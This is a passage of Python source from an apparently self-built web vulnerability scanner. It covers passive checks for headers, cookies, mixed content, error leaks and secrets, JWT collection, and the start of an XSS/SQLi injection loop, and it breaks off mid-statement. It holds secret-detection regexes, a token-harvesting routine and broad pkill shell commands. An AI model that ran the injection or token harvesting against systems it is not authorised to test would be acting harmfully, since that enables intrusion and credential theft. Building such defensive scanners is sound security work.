    LOGIN_KEYWORDS = re.compile(
        r'<form[^>]*(?:login|signin|sign-in|auth)[^>]*>|'
        r'<title[^>]*>\s*(?:login|sign in|sign-in|authentication)\s*</title>|'
        r'(?:please\s+log\s*in|session\s+(?:expired|timeout)|'
                r'you\s+have\s+been\s+logged\s+out|'
                r'authentication\s+required)',
        re.IGNORECASE,
    )

    def __init__(
        self,
        payloads: List[str],
        max_payload_bytes: int,
        rate_limiter: RateLimiter,
        logger: ExecutionTrailLogger,
        evidence_dir: Path,
        is_authenticated: bool = False,
        skip_tests: int = 0,
        verbose_tests: bool = False,
        ignore_session_expiry: bool = False,
        debug_mode: bool = False,
        no_watchdog: bool = False,
    ) -> None:
        self.payloads = payloads
        # Hard cap on payload size. Oversized payloads can crash vulnerable
        # endpoints (accidental DoS) and balloon evidence files. We enforce
        # the cap at injection time, not just at load time, so dynamically
        # generated payloads (e.g. with random suffixes) are also bounded.
        self.max_payload_bytes = max(1, int(max_payload_bytes))
        self.rate_limiter = rate_limiter
        self.logger = logger
        self.evidence_dir = evidence_dir
        self.evidence_dir.mkdir(parents=True, exist_ok=True)
        # Whether this scan is authenticated (i.e. the user provided a login
        # URL or manual-login session). When False, we SKIP the login-page
        # keyword check in session-expiry detection — otherwise any public
        # page that happens to contain a login form (e.g. the demo site at
        # /api/demo) would falsely pause the scan as if the session had
        # expired.
        self.is_authenticated = bool(is_authenticated)
        # When True, completely disable session-expiry detection. The scanner
        # will NEVER pause for re-login. Used for unauthenticated scans where
        # the target redirects everything to /login (which is normal for an
        # unauthenticated visitor, NOT a session expiry).
        self.ignore_session_expiry = bool(ignore_session_expiry)
        # Debug mode: log every Playwright action with timing + response details
        self.debug_mode = bool(debug_mode)
        # Debug: skip the first N tests in active_scan. Used with --skip-tests
        # to jump directly to a problematic test (e.g. test 460 that freezes).
        self.skip_tests = max(0, int(skip_tests))
        # Debug: log EVERY test (not just every 10th). Used with --verbose-tests
        # to see exactly which test is hanging.
        self.verbose_tests = bool(verbose_tests)
        # When True, DISABLE all 3 watchdogs (per-test 60s pkill, progress
        # 120s pkill, context recycle every 50 tests). Used for debugging
        # to determine if a hang is caused by the watchdogs killing Chrome
        # at a bad time or by something else. WARNING: with watchdogs
        # disabled, a truly hung test will freeze the scan forever.
        self.no_watchdog = bool(no_watchdog)

    # =====================================================================
    # PASSIVE CHECKS
    # =====================================================================

    async def passive_scan(
        self,
        page: Page,
        header_records: List[HeaderRecord],
        target_url: str,
        crawl_map: Optional[List["CrawledURL"]] = None,
    ) -> PassiveFindings:
        """Run all passive checks against the already-loaded page.

        Passive checks do NOT send payloads. They inspect:
          (a) Security headers — present or missing?
          (b) Cookies — Secure / HttpOnly / SameSite flags?
          (c) Mixed content — HTTPS page loading HTTP resources?
        """
        out = PassiveFindings()

        # --- (a) Security header presence check --------------------------
        # We only check the well-known security headers. The full header
        # audit (Table A / Table B) is handled by the HeaderCapture module
        # and displayed in its own report tab. Here we just produce a list
        # of MISSING headers for the Executive Summary and the OWASP A05
        # (Security Misconfiguration) finding bucket.
        security_headers = [
            "strict-transport-security",   # HSTS
            "content-security-policy",     # CSP
            "x-frame-options",             # Clickjacking (legacy)
            "x-content-type-options",      # MIME sniffing
        ]
        present = {h.name.lower() for h in header_records}
        for h in security_headers:
            if h not in present:
                out.missing_security_headers.append(h)
                self.logger.log("passive_missing_header", h)

        # --- (b) Cookie flag inspection ----------------------------------
        # We pull cookies from the Playwright context (which has been
        # navigating the target). For each cookie we check:
        #   secure:    cookie only sent over HTTPS
        #   httpOnly:  cookie not accessible from JS (mitigates XSS token theft)
        #   sameSite:  cookie not sent on cross-site requests (mitigates CSRF)
        # Missing flags are recorded but NOT auto-flagged as vulnerabilities
        # — context matters (e.g. a CSRF token cookie may legitimately be
        # non-HttpOnly so the JS can read it).
        try:
            cookies = await _pw(page.context.cookies, default=[])
        except Exception as e:
            self.logger.log("passive_cookies", f"failed to read cookies: {e}")
            cookies = []
        for c in cookies:
            issues = []
            # Capture the raw attributes so the UI can render them as
            # explicit green/red pills — the engineer can SEE that SameSite
            # was checked even when it's fine (previously it was only
            # mentioned inside the issues string when something was wrong).
            secure = bool(c.get("secure"))
            http_only = bool(c.get("httpOnly"))
            same_site = str(c.get("sameSite") or "")
            expires = c.get("expires", -1)
            if not secure and target_url.startswith("https://"):
                issues.append("missing Secure flag")
            if not http_only:
                issues.append("missing HttpOnly flag")
            ss_lower = same_site.lower()
            if not same_site or ss_lower == "none":
                # sameSite=None (or unset) requires Secure in modern browsers
                # and offers no CSRF protection — flag it.
                issues.append(f"sameSite={same_site or 'unset'}")
            elif ss_lower == "lax":
                # Lax is the modern default and gives partial CSRF protection
                # (blocks cross-site POST but allows top-level GET). Worth a
                # note so the engineer knows it was checked, not an error.
                issues.append("sameSite=Lax (partial CSRF protection)")
            # Strict = no issue (best CSRF protection)
            if issues:
                out.insecure_cookies.append({
                    "name": c.get("name", ""),
                    "domain": c.get("domain", ""),
                    "path": c.get("path", ""),
                    # NEW explicit attribute fields (UI pills). Old UI code
                    # that only reads name/domain/path/issues still works.
                    "secure": secure,
                    "http_only": http_only,
                    "same_site": same_site or "unset",
                    "expires": expires,
                    "issues": issues,
                })
                self.logger.log(
                    "passive_cookie_issue",
                    f"name={c.get('name','')} "
                    f"secure={secure} httpOnly={http_only} "
                    f"sameSite={same_site or 'unset'} "
                    f"issues={','.join(issues)}",
                )

        # --- (c) Mixed-content detection ---------------------------------
        # An HTTPS page that loads HTTP sub-resources (scripts, images,
        # iframes) creates a mixed-content situation that browsers may
        # block (active mixed content) or downgrade (passive mixed content).
        # We scan the DOM for any element with an http:// src/href.
        try:
            mixed = await _pw(page.evaluate,
                """() => {
                    const results = [];
                    const sel = '[src], [href], [data], [poster]';
                    document.querySelectorAll(sel).forEach(el => {
                        const url = el.src || el.href || el.data || el.poster;
                        if (url && typeof url === 'string' && url.startsWith('http://')) {
                            results.push({
                                tag: el.tagName.toLowerCase(),
                                url: url,
                                attr: el.src ? 'src' : (el.href ? 'href' : 'other')
                            });
                        }
                    });
                    // Also scan inline scripts for http:// URLs.
                    document.querySelectorAll('script:not([src])').forEach(s => {
                        const matches = (s.textContent || '').match(/http:\\/\\/[^\\s'"<>]+/g) || [];
                        matches.forEach(u => results.push({tag:'script:inline', url:u, attr:'text'}));
                    });
                    return results;
                }"""
            , default=[],
            )
        except Exception as e:
            self.logger.log("passive_mixed_content",
                            f"evaluation failed: {e}")
            mixed = []
        for m in mixed:
            out.mixed_content.append(m)
            self.logger.log(
                "passive_mixed_content",
                f"tag={m.get('tag')} url={m.get('url')}",
            )

        # --- (d) Error messages in page (A10/A05) -----------------------
        # Scan the page HTML for error messages that reveal internal
        # info: stack traces, SQL errors, file paths, debug output, etc.
        # The patterns are hoisted to method scope so the front-page scan,
        # the CSS scan, and the multi-page loop (h) all share them.
        error_patterns = [
            (r"(?:stack\s*trace|traceback).*?(?:file|line|at)\s+", "Stack Trace", "high"),
            (r"(?:SQL|MySQL|PostgreSQL|SQLite|ORA-\d+|Microsoft SQL Server).*?(?:error|syntax|near)", "SQL Error", "high"),
            (r"(?:Warning|Notice|Deprecated|Fatal error|Parse error).*?(?:line \d+|in /)", "PHP Error", "high"),
            (r"(?:Exception|Error|NullPointerException|ClassCastException).*?(?:at\s+\w+|line\s+\d+)", "Java Error", "high"),
            (r"(?:System\.NullReferenceException|System\.IndexOutOfRangeException|System\.InvalidCastException)", ".NET Error", "high"),
            (r"/(?:home|var|usr|opt|etc|tmp|root|srv)/[^\s\"'<>\)]+", "File Path Disclosure", "medium"),
            (r"(?:debug\s*[:=]|DEBUG\s*[:=]|var_dump|print_r|console\.log)\s*\(", "Debug Output", "medium"),
            (r"(?:internal\s*server\s*error|502\s*bad\s*gateway|503\s*service)", "Server Error", "medium"),
            (r"(?:undefined\s+(?:variable|index|property|function)|ReferenceError|TypeError)", "JS Error", "low"),
        ]
        sensitive_patterns = [
            (r'\b[A-Za-z0-9._%+-]+@[A-Za-z0-9.-]+\.[A-Z|a-z]{2,}\b', "Email Address", "low"),
            (r'(?:api[_-]?key|apikey|api[_-]?secret)["\s:=]+([A-Za-z0-9_\-]{20,})', "API Key", "high"),
            (r'(?:secret|password|passwd|token)["\s:=]+([A-Za-z0-9_\-]{8,})', "Credential", "high"),
            (r'\b(?:10\.\d{1,3}\.\d{1,3}\.\d{1,3}|172\.(?:1[6-9]|2[0-9]|3[01])\.\d{1,3}\.\d{1,3}|192\.168\.\d{1,3}\.\d{1,3})\b', "Internal IP", "medium"),
            (r'\b(?:25[0-5]|2[0-4]\d|1?\d?\d)(?:\.(?:25[0-5]|2[0-4]\d|1?\d?\d)){3}\b', "IP Address", "low"),
            (r'\b\d{3}-\d{2}-\d{4}\b', "SSN Pattern", "high"),
            (r'\b(?:\d[ -]*?){13,16}\b', "Credit Card Pattern", "high"),
            (r'-----BEGIN (?:RSA |EC |DSA |OPENSSH )?PRIVATE KEY-----', "Private Key", "high"),
            (r'(?:AKIA|ASIA)[A-Z0-9]{16}', "AWS Access Key", "high"),
            (r'eyJ[A-Za-z0-9_=-]+\.eyJ[A-Za-z0-9_=-]+\.[A-Za-z0-9._=-]+', "JWT Token", "medium"),
            (r'(?:mongodb|postgres|mysql|redis)://[^\s"<>\']+', "Database URL", "high"),
            (r'(?:ghp|gho|ghu|ghs|ghr)_[A-Za-z0-9]{36}', "GitHub Token", "high"),
            (r'sk-[A-Za-z0-9]{20,}', "OpenAI API Key", "high"),
        ]
        try:
            page_html = await _pw(page.content, default="")
            for pattern, category, severity in error_patterns:
                matches = _re_module.finditer(pattern, page_html, _re_module.IGNORECASE)
                for m in matches:
                    snippet = page_html[max(0, m.start()-50):m.end()+50].strip()
                    # Clean HTML tags from snippet
                    snippet = _re_module.sub(r'<[^>]+>', '', snippet)[:200]
                    out.error_messages.append({
                        "category": category,
                        "severity": severity,
                        "snippet": snippet,
                        # NB: must use EXACT strings from OWASP_2025_CATEGORIES
                        # or the OWASP tab silently hides these. (The previous
                        # "A10:2025 SSRF" / "A05:2025 Security Misconfiguration"
                        # literals don't exist in that list.)
                        "owasp": "A05:2025 Injection" if "Path" in category else "A02:2025 Security Misconfiguration",
                    })
                    self.logger.log("passive_error_message",
                                   f"category={category} severity={severity} snippet={snippet[:80]!r}")
        except Exception as e:
            self.logger.log("passive_error_messages", f"scan failed: {e}")

        # --- (e) Session cookie configuration (A07) ---------------------
        # Check cookie attributes beyond Secure/HttpOnly/SameSite:
        # - Expiry too long (session cookies should expire)
        # - Domain too broad (e.g. domain=.example.com for a subdomain app)
        # - Path too broad (path=/ for a subdirectory app)
        for c in cookies:
            config_issues = []
            name = c.get("name", "").lower()
            # Check if this looks like a session cookie
            is_session = any(kw in name for kw in
                           ("session", "sid", "token", "auth", "jwt", "phpsessid",
                            "jsessionid", "asp.net", "connect.sid"))
            if not is_session:
                continue

            # Check expiry
            expires = c.get("expires", -1)
            if expires > 0:
                # Cookie has an explicit expiry — check if it's too long
                import time as _time
                days_until_expiry = (expires - _time.time()) / 86400
                if days_until_expiry > 30:
                    config_issues.append(
                        f"Session cookie expires in {days_until_expiry:.0f} days "
                        f"(should be short-lived or session-only)")
                elif days_until_expiry > 7:
                    config_issues.append(
                        f"Session cookie expires in {days_until_expiry:.0f} days "
                        f"(consider shorter expiry)")

            # Check domain scope
            domain = c.get("domain", "")
            if domain.startswith("."):
                config_issues.append(
                    f"Cookie domain '{domain}' is overly broad (applies to all subdomains)")

            # Check path scope
            cookie_path = c.get("path", "/")
            if cookie_path == "/" and is_session:
                # Session cookies on / are common but worth noting
                config_issues.append(
                    f"Cookie path '/' (consider restricting to app path)")

            if config_issues:
                out.session_cookie_config.append({
                    "name": c.get("name", ""),
                    "domain": domain,
                    "path": cookie_path,
                    "expires": expires,
                    "issues": config_issues,
                    # NB: must be an EXACT string from OWASP_2025_CATEGORIES —
                    # the OWASP tab groups by exact category match, so a stray
                    # literal here would silently hide every session-cookie
                    # finding from the report. (Was the OWASP-2021 title.)
                    "owasp": "A07:2025 Authentication Failures",
                })
                self.logger.log("passive_session_cookie_config",
                               f"name={c.get('name','')} issues={'; '.join(config_issues)}")

        # --- (f) Sensitive information in pages (A02/A01) ---------------
        # Scan page HTML + inline JS for sensitive data:
        # emails, API keys, internal IPs, credit cards, SSN, private keys.
        # (sensitive_patterns hoisted above block (d).)
        try:
            for pattern, category, severity in sensitive_patterns:
                matches = _re_module.finditer(pattern, page_html)
                seen_values = set()  # dedup
                for m in matches:
                    value = m.group(0)[:100]
                    if value in seen_values:
                        continue
                    seen_values.add(value)
                    # Mask sensitive values for display
                    if severity == "high":
                        masked = value[:4] + "***" + value[-4:] if len(value) > 8 else "***"
                    else:
                        masked = value
                    out.sensitive_info.append({
                        "category": category,
                        "severity": severity,
                        "value": masked,
                        # Cryptographic Failures is A04 in the 2025 list, not A02.
                        "owasp": "A04:2025 Cryptographic Failures" if severity == "high" else "A01:2025 Broken Access Control",
                    })
                    self.logger.log("passive_sensitive_info",
                                   f"category={category} severity={severity} value={masked[:40]}")
        except Exception as e:
            self.logger.log("passive_sensitive_info", f"scan failed: {e}")

        # --- (g0) Sensitive info in CSS files -----------------------------------
        # CSS files occasionally leak secrets/internal structure in comments
        # or url() references (developer notes, internal hostnames, pasted
        # API keys). We fetch each SAME-ORIGIN stylesheet linked from the
        # page and run the SAME sensitive-info regexes over it. External/CDN
        # stylesheets are skipped (low signal + cross-origin noise). This is
        # the optional CSS coverage — bounded to keep footprint small.
        try:
            from urllib.parse import urljoin as _urljoin
            tgt_host = (urlparse(target_url).hostname or "").lower()
            link_re = re.compile(
                r'<link[^>]+rel=["\']stylesheet["\'][^>]+href=["\']([^"\']+)["\']'
                r'|<link[^>]+href=["\']([^"\']+)["\'][^>]+rel=["\']stylesheet["\']',
                re.I,
            )
            css_urls: List[str] = []
            for m in link_re.finditer(page_html or ""):
                raw = m.group(1) or m.group(2)
                if not raw:
                    continue
                absu = _urljoin(target_url, raw)
                try:
                    if (urlparse(absu).hostname or "").lower() != tgt_host:
                        continue  # external/CDN — skip
                except Exception:
                    continue
                if absu not in css_urls:
                    css_urls.append(absu)
                if len(css_urls) >= 10:
                    break
            css_hits = 0
            for css_url in css_urls:
                try:
                    resp = await _pw(
                        page.context.request.get, css_url, timeout=8000,
                        default=None,
                    )
                    if resp is None:
                        continue
                    css_text = await _pw(resp.text, default="")
                except Exception:
                    continue
                if not css_text:
                    continue
                css_text = css_text[:50000]  # cap size
                seen_css_vals = set()
                for pattern, category, severity in sensitive_patterns:
                    for m in _re_module.finditer(pattern, css_text):
                        value = m.group(0)[:100]
                        if value in seen_css_vals:
                            continue
                        seen_css_vals.add(value)
                        if severity == "high":
                            masked = value[:4] + "***" + value[-4:] if len(value) > 8 else "***"
                        else:
                            masked = value
                        out.sensitive_info.append({
                            "category": f"{category} (in CSS)",
                            "severity": severity,
                            "value": masked,
                            "url": css_url,
                            # Both literals must be EXACT strings from
                            # OWASP_2025_CATEGORIES (the OWASP tab groups by
                            # exact match). A02/A05 were wrong: Cryptographic
                            # Failures is A04, Security Misconfig is A02.
                            "owasp": "A04:2025 Cryptographic Failures" if severity == "high" else "A02:2025 Security Misconfiguration",
                        })
                        css_hits += 1
            if css_hits:
                self.logger.log("passive_css_sensitive",
                                f"scanned {len(css_urls)} CSS file(s); "
                                f"{css_hits} sensitive item(s) found")
        except Exception as e:
            self.logger.log("passive_css_sensitive", f"scan failed: {e}")

        # --- (h) Multi-page passive scan (per-URL error/sensitive findings) -----
        # The blocks above scanned the SINGLE front page. To tell the engineer
        # WHICH URL an error/sensitive item was found on (and screenshot THAT
        # page, not the front page), we re-run the same error + sensitive
        # regexes over EVERY in-scope crawled page (respecting the crawl depth
        # the user set — no cap). Each finding here carries the real source
        # URL + a per-page screenshot when findings occur on that page.
        if crawl_map:
            try:
                done_urls = {target_url}
                for cu in crawl_map:
                    if GLOBAL_STATE.stop_event.is_set():
                        break
                    if not getattr(cu, "in_scope", True) or not getattr(cu, "url", ""):
                        continue
                    if cu.url in done_urls:
                        continue
                    done_urls.add(cu.url)
                    try:
                        async with self.rate_limiter.slot():
                            await _pw(page.goto, cu.url, wait_until="domcontentloaded",
                                      timeout=10000, default=None)
                            phtml = await _pw(page.content, default="")
                    except Exception:
                        continue
                    if not phtml:
                        continue
                    before_err = len(out.error_messages)
                    before_sen = len(out.sensitive_info)
                    # Error-message scan (same patterns as the front page).
                    for pattern, category, severity in error_patterns:
                        for m in _re_module.finditer(pattern, phtml, _re_module.IGNORECASE):
                            snippet = _re_module.sub(
                                r'<[^>]+>', '',
                                phtml[max(0, m.start() - 50):m.end() + 50].strip())[:200]
                            out.error_messages.append({
                                "category": category,
                                "severity": severity,
                                "snippet": snippet,
                                "url": cu.url,
                                "owasp": "A05:2025 Injection" if "Path" in category else "A02:2025 Security Misconfiguration",
                            })
                    # Sensitive-info scan (same patterns as the front page).
                    for pattern, category, severity in sensitive_patterns:
                        seen = set()
                        for m in _re_module.finditer(pattern, phtml):
                            value = m.group(0)[:100]
                            if value in seen:
                                continue
                            seen.add(value)
                            if severity == "high":
                                masked = value[:4] + "***" + value[-4:] if len(value) > 8 else "***"
                            else:
                                masked = value
                            out.sensitive_info.append({
                                "category": category,
                                "severity": severity,
                                "value": masked,
                                "url": cu.url,
                                "owasp": "A04:2025 Cryptographic Failures" if severity == "high" else "A01:2025 Broken Access Control",
                            })
                    new_err = out.error_messages[before_err:]
                    new_sen = out.sensitive_info[before_sen:]
                    if new_err or new_sen:
                        # Per-page screenshot — only when this page had findings.
                        try:
                            import time as _time_h
                            import uuid as _uuid_h
                            ts = _time_h.strftime("%Y%m%d_%H%M%S")
                            ss = self.evidence_dir / f"passive_{ts}_{_uuid_h.uuid4().hex[:6]}.png"
                            await _pw(page.screenshot, path=str(ss), full_page=True, default=None)
                            if ss.exists():
                                for entry in new_err + new_sen:
                                    entry["screenshot"] = ss.name
                        except Exception:
                            pass
                        self.logger.log(
                            "passive_multipage",
                            f"url={cu.url} errors={len(new_err)} sensitive={len(new_sen)}")
                # Navigate back to the target so later phases start clean.
                try:
                    await _pw(page.goto, target_url, wait_until="domcontentloaded",
                              timeout=15000, default=None)
                except Exception:
                    pass
            except Exception as e:
                self.logger.log("passive_multipage", f"multi-page scan failed: {e}")

        # --- (g) Screenshot for the error/sensitive-info sub-tabs ----------------
        # If we found any error messages or sensitive info on this page, take
        # a full-page screenshot so the engineer can SEE the context (visible
        # stack traces, rendered error pages, etc.). Some sensitive data
        # (e.g. API keys in HTML comments) won't be visible in a screenshot,
        # but the screenshot still shows the page state at detection time.
        #
        # The screenshot filename is stored on out.screenshot_path and
        # persisted to passive_findings.json via asdict(); the UI's Error
        # Messages + Sensitive Info sub-tabs render it via the evidence API.
        if out.error_messages or out.sensitive_info:
            try:
                import time as _time
                ts = _time.strftime("%Y%m%d_%H%M%S")
                ss_path = self.evidence_dir / f"passive_{ts}.png"
                await _pw(page.screenshot, path=str(ss_path),
                          full_page=True, default=None)
                if ss_path.exists():
                    out.screenshot_path = ss_path.name
                    self.logger.log("passive_screenshot",
                                   f"saved {ss_path.name} "
                                   f"(errors={len(out.error_messages)} "
                                   f"sensitive={len(out.sensitive_info)})")
            except Exception as e:
                self.logger.log("passive_screenshot", f"failed: {e}")

        # Stamp the URL each error/sensitive finding came from, so the UI can
        # show it (helps the engineer reproduce). setdefault keeps any URL the
        # detection code may already have set.
        for e in out.error_messages:
            e.setdefault("url", target_url)
        for s in out.sensitive_info:
            s.setdefault("url", target_url)

        # --- (h) JWT token collection (for the post-scan jwt_analysis phase) ---
        # Harvest eyJ... tokens from cookie values + the page body. The
        # jwt_analysis phase (run_scan) reads jwt_tokens.json and does the
        # actual decode + weak-claim + alg=none checks. Collection happens
        # here because passive_scan has the live page + cookie jar.
        jwt_tokens: List[Dict[str, Any]] = []
        try:
            for c in cookies:
                val = str(c.get("value", "") or "")
                for m in JWT_TOKEN_RE.finditer(val):
                    jwt_tokens.append({
                        "token": m.group(0),
                        "source": "cookie",
                        "cookie_name": c.get("name", ""),
                        "url": target_url,
                    })
            # Body scan — page_html was captured during the sensitive_info pass.
            if isinstance(page_html, str) and page_html:
                seen_in_body = set()
                for m in JWT_TOKEN_RE.finditer(page_html):
                    tok = m.group(0)
                    if tok in seen_in_body:
                        continue
                    seen_in_body.add(tok)
                    jwt_tokens.append({
                        "token": tok, "source": "body", "url": target_url,
                    })
            # Merge with any tokens already on disk (resume / multi-page).
            jwt_path = self.evidence_dir.parent / "jwt_tokens.json"
            existing: List[Dict[str, Any]] = []
            try:
                existing = json.loads(jwt_path.read_text(encoding="utf-8"))
                if not isinstance(existing, list):
                    existing = []
            except Exception:
                existing = []
            seen_set = {(t.get("token"), t.get("source")) for t in existing}
            for t in jwt_tokens:
                key = (t.get("token"), t.get("source"))
                if key not in seen_set:
                    existing.append(t)
                    seen_set.add(key)
            jwt_path.write_text(
                json.dumps(existing, indent=2, ensure_ascii=False, default=str),
                encoding="utf-8",
            )
            if jwt_tokens:
                self.logger.log("jwt_tokens_collected",
                                f"captured {len(jwt_tokens)} JWT(s) on {target_url} "
                                f"(total in file: {len(existing)})")
        except Exception as e:
            self.logger.log("jwt_tokens_collected", f"failed: {e}")

        return out

    # =====================================================================
    # ACTIVE CHECKS (XSS & SQLi)
    # =====================================================================

    async def active_scan(
        self,
        page: Page,
        inputs: List[InputField],
    ) -> List[Finding]:
        """Inject payloads into every input, capture evidence, return findings.

        Also checks for session expiry (401/302/login page) after each
        navigation. If the session has expired, the scanner pauses:
          1. Clears the browser context's storage state (cookies + localStorage)
          2. Saves a pause_state.json file
          3. Sets GLOBAL_STATE.stop_event (pauses the scan)
          4. Logs the session duration

        For each (input, payload) pair we:
          1. Truncate the payload if it exceeds --max-payload-bytes.
          2. Navigate to the input's URL.
          3. Inject the payload (fill the form field, or append to URL).
          4. Submit the form (or just navigate for URL params).
          5. Capture the raw request and response via Playwright's
             page.on('request') / page.on('response') handlers.
          6. Run regex matchers against the response body.
          7. If matched, create a Finding with full evidence trail.
          8. For high-severity findings, take a screenshot at the moment
             of detection.
        """
        findings: List[Finding] = []
        # FRESH PAGE PER PAYLOAD:
        # We create a new page for EVERY payload injection. This completely
        # isolates each test — if a payload causes a browser hang (javascript:
        # URI, data: URI, slow iframe, infinite JS loop, etc.), the stuck page
        # is simply discarded and a new one is created for the next payload.
        #
        # The session (cookies + localStorage) is stored on the BrowserContext,
        # NOT the Page. Creating a new page via `context.new_page()` automatically
        # inherits the session, so authenticated scans work correctly.
        #
        # This approach makes the scanner immune to ANY payload that triggers
        # a browser hang — we no longer rely on _pw() to recover a poisoned
        # page, because the page is disposable.

        # The `page` parameter is the shared page used for crawling/header
        # capture. We extract its BrowserContext so we can create fresh pages
        # that inherit the same session.
        context = page.context
        # Save the initial cookies so we can recreate the context if needed.
        # Cookie preservation is critical for authenticated scans.
        try:
            initial_cookies = await asyncio.wait_for(
                context.cookies(), timeout=5.0
            )
        except Exception:
            initial_cookies = []
        # The browser that owns the context — needed to create new contexts.
        browser = context.browser

        # --- Set up the heartbeat file for the external supervisor ---
        # The supervisor (bin/supervisor.py) is a separate OS process
        # that monitors heartbeat.json. If it goes stale, the supervisor
        # kills this scanner PID and restarts with --resume --skip-tests.
        # We set the global path so _write_heartbeat() knows where to write.
        global _GLOBAL_HEARTBEAT_PATH
        _GLOBAL_HEARTBEAT_PATH = self.evidence_dir.parent / "heartbeat.json"
        # Write an initial heartbeat so the supervisor knows we're alive
        # before the first test completes.
        _write_heartbeat(0, len(inputs) * len(self.payloads), phase="active_start")

        # Track how many pages we've created.
        pages_created = 0
        # Recycle every 20 tests — kill Chrome + restart to prevent
        # resource accumulation. Was 50, but that was too high: orphaned
        # pages from failed close() calls accumulated and exhausted the
        # browser's CDP connection pool after ~200-500 tests, causing
        # new_page() to hang forever. 20 is aggressive enough to purge
        # resources before they pile up, but not so frequent that it
        # slows the scan (each recycle takes ~3-5s).
        CONTEXT_RECYCLE_INTERVAL = 20
        contexts_created = 0

        # --- PROGRESS WATCHDOG ---
        # A separate OS thread that monitors whether the scan is making
        # progress. If no test completes for 120 seconds, it kills Chrome
        # to unblock the hung Playwright call. The scan CONTINUES (does
        # NOT abort) — the retry loop will restart Chrome and the next
        # test will run.
        #
        # This runs in-place on the same scan, same tab. No abort, no
        # new scan. Just kill Chrome → retry loop fires → scan continues.
        #
        # DISABLED when self.no_watchdog is True (--no-watchdog flag or
        # WEBRECON_DISABLE_WATCHDOG=1 env var). Used for debugging to
        # determine if the watchdog is the cause of a hang.
        import threading as _threading_mod
        last_progress_time = [time.time()]  # mutable container for thread

        if not self.no_watchdog:
            def _progress_watchdog():
                """Background thread: kill Chrome if no progress for 120s.

                Does NOT abort the scan — just kills Chrome to unblock the
                hung Playwright call. The retry loop in the main thread will
                detect the dead browser and restart it.
                """
                while not GLOBAL_STATE.stop_event.is_set():
                    time.sleep(10)  # check every 10s
                    elapsed = time.time() - last_progress_time[0]
                    if elapsed > 120.0:
                        # No progress for 120s — kill Chrome to unblock
                        print(
                            f"\n[!] PROGRESS WATCHDOG: No progress for {elapsed:.0f}s — "
                            f"killing Chrome + restarting (scan will continue)",
                            file=sys.stderr, flush=True,
                        )
                        import subprocess as _sp
                        _sp.run("pkill -9 -f chromium; pkill -9 -f chrome; pkill -9 -f headless; pkill -9 -f chrome-headless-shell; pkill -9 -f remote-debugging-pipe", shell=True, timeout=5, capture_output=True)
                        # Reset the timer so we don't kill again immediately
                        # (give the retry loop 120s to restart + run the next test)
                        last_progress_time[0] = time.time()
                        # Do NOT set stop_event — the scan continues

            watchdog_t = _threading_mod.Thread(target=_progress_watchdog, daemon=True)
            watchdog_t.start()
        else:
            self.logger.log("watchdog_skipped", "progress watchdog disabled (--no-watchdog)")

        total_inputs = len(inputs)
        total_payloads = len(self.payloads)
        total_tests = total_inputs * total_payloads
        tests_done = 0
        scan_start_time = time.time()
        for inp_idx, inp in enumerate(inputs):
            if GLOBAL_STATE.stop_event.is_set():
                break
            for payload_idx, payload in enumerate(self.payloads):
                if GLOBAL_STATE.stop_event.is_set():
                    break
                tests_done += 1

                # --- Debug: skip first N tests (--skip-tests flag) ---
                # Used to jump directly to a problematic test (e.g. test 460
                # that freezes). The crawl + header capture + SSL phases
                # still ran normally; we only skip active fuzzing tests.
                if tests_done <= self.skip_tests:
                    continue

                # Log progress every 10 tests, every input change, OR every
                # test if --verbose-tests is enabled.
                # This doubles as a HEARTBEAT — if the UI sees these
                # arriving, the scan is alive. If they stop, a single
                # test is hanging (the 30s hard cap below will eventually
                # free it by discarding the stuck page).
                if self.verbose_tests or tests_done % 10 == 0 or payload_idx == 0:
                    elapsed = time.time() - scan_start_time
                    if tests_done > 0 and elapsed > 0:
                        rate = tests_done / elapsed  # tests per second
                        remaining = (total_tests - tests_done) / rate
                        # In verbose mode, include the payload itself (truncated)
                        # so the engineer can see EXACTLY which payload is hanging.
                        payload_preview = f" payload={payload[:60]!r}" if self.verbose_tests else ""
                        self.logger.log(
                            "active_progress",
                            f"input {inp_idx+1}/{total_inputs} "
                            f"payload {payload_idx+1}/{total_payloads} "
                            f"({tests_done}/{total_tests} done) "
                            f"ETA {remaining:.0f}s"
                            f"{payload_preview}",
                        )

                # Enforce payload size cap. Truncation (not skip) so we
                # still record the attempt in the trail — the engineer
                # should know a payload was rejected for size.
                original_len = len(payload.encode("utf-8"))
                if original_len > self.max_payload_bytes:
                    payload = payload.encode("utf-8")[:self.max_payload_bytes]\
                                  .decode("utf-8", errors="ignore")
                    self.logger.log(
                        "active_payload_truncated",
                        f"original={original_len}B truncated={len(payload)}B",
                    )

                # --- Create a FRESH page for this payload ---
                pages_created += 1

                # --- Every N tests, proactively kill Chrome + restart ---
                # This prevents page accumulation before it becomes a problem.
                # DISABLED when self.no_watchdog is True.
                if not self.no_watchdog and pages_created % CONTEXT_RECYCLE_INTERVAL == 0:
                    self.logger.log("context_recycle",
                                   f"proactive recycle at {pages_created} pages")
                    # Force a restart by setting test_page = None and letting
                    # the retry loop below handle it.
                    context = None  # force restart in the retry loop below

                # --- SIMPLIFIED RETRY LOOP ---
                # Try up to 3 times to create a working page.
                # On failure: pkill Chrome → restart Playwright → new browser → new page → verify.
                # If all 3 tries fail, skip this test and move on.
                test_page: Optional[Page] = None
                for attempt in range(3):
                    try:
                        # If context is None (first try or after recycle), create everything fresh
                        if context is None:
                            # Save cookies
                            saved_cookies = []
                            try:
                                if browser is not None:
                                    saved_cookies = await asyncio.wait_for(
                                        browser.contexts[0].cookies(), timeout=3.0) if browser.contexts else []
                            except:
                                saved_cookies = initial_cookies

                            # pkill Chrome
                            import subprocess as _sp
                            _sp.run("pkill -9 -f chromium; pkill -9 -f chrome; pkill -9 -f headless; pkill -9 -f chrome-headless-shell; pkill -9 -f remote-debugging-pipe", shell=True, timeout=5, capture_output=True)
                            await asyncio.sleep(3.0)  # 3s delay for OS cleanup

                            # Restart Playwright entirely
                            try:
                                if GLOBAL_STATE.playwright_ctx is not None:
                                    try:
                                        await asyncio.wait_for(GLOBAL_STATE.playwright_ctx.stop(), timeout=3.0)
                                    except:
                                        pass
                            except:
                                pass
                            from playwright.async_api import async_playwright as _apw
                            pw = await _apw().start()
                            GLOBAL_STATE.playwright_ctx = pw

                            # New browser + context + cookies
                            browser = await asyncio.wait_for(
                                pw.chromium.launch(headless=True, args=["--no-sandbox"]),
                                timeout=15.0)
                            GLOBAL_STATE.browser = browser
                            context = await asyncio.wait_for(
                                browser.new_context(
                                    user_agent="Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
                                    viewport={"width": 1280, "height": 720},
